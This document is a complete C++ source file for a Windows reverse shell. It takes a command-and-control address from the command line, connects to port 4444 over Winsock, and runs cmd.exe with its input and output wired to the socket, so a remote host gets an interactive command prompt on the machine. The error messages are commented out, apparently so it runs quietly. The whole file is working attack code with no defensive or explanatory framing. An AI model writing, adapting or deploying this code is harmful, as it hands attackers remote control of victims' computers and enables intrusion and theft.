// cl.exe Shell.cpp /link ws2_32.lib
# include <iostream>
# include <WinSock2.h>
# include <ws2tcpip.h>
# include <windows.h>

# pragma comment(lib, "ws2_32.lib")
using namespace std;

int main(int argc, char *argv[])
{
	const char* C2HOST = argv[1]; // C2IP as input via commandline
	int C2PORT = 4444; // C2PORT 

	WSADATA wsaData;
	SOCKET clientSocket;
	sockaddr_in saddr;
	WORD wVersion;
	int err, conn;
	
	// Initialising WsaStartup
	wVersion = MAKEWORD(2, 2);
	err = WSAStartup(wVersion, &wsaData);

	if (err != 0) {
		//cout << "[-] WSAinit failed !!\n";
		WSACleanup();
		return -1;
	}

	// Initialising Wsasocket for communication
	clientSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL);

	if (clientSocket == INVALID_SOCKET) {
		//cout << "[-] SocketInit Failed !!\n";
		closesocket(clientSocket);
		WSACleanup();
	}


	saddr.sin_family = AF_INET;
	saddr.sin_addr.s_addr = inet_addr(C2HOST);
	saddr.sin_port = htons(C2PORT);

	// connect to the server
	conn = WSAConnect(clientSocket, (SOCKADDR *)&saddr, sizeof(saddr), NULL, NULL, NULL, NULL);

	if (conn == SOCKET_ERROR) {
		//cout << "[-] Failed to connect !!\n";
		closesocket(clientSocket);
		WSACleanup();
		return -1;
	}

	// setup the shell
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	const char *shellPath = "C:\\Windows\\System32\\cmd.exe";

	// clean out the memory of structures
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));

	// setting startupinfo parameters
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)clientSocket;

	if (CreateProcess(NULL, (LPSTR)shellPath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) != 0) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	
	closesocket(clientSocket);
	WSACleanup();

	return 0;
}
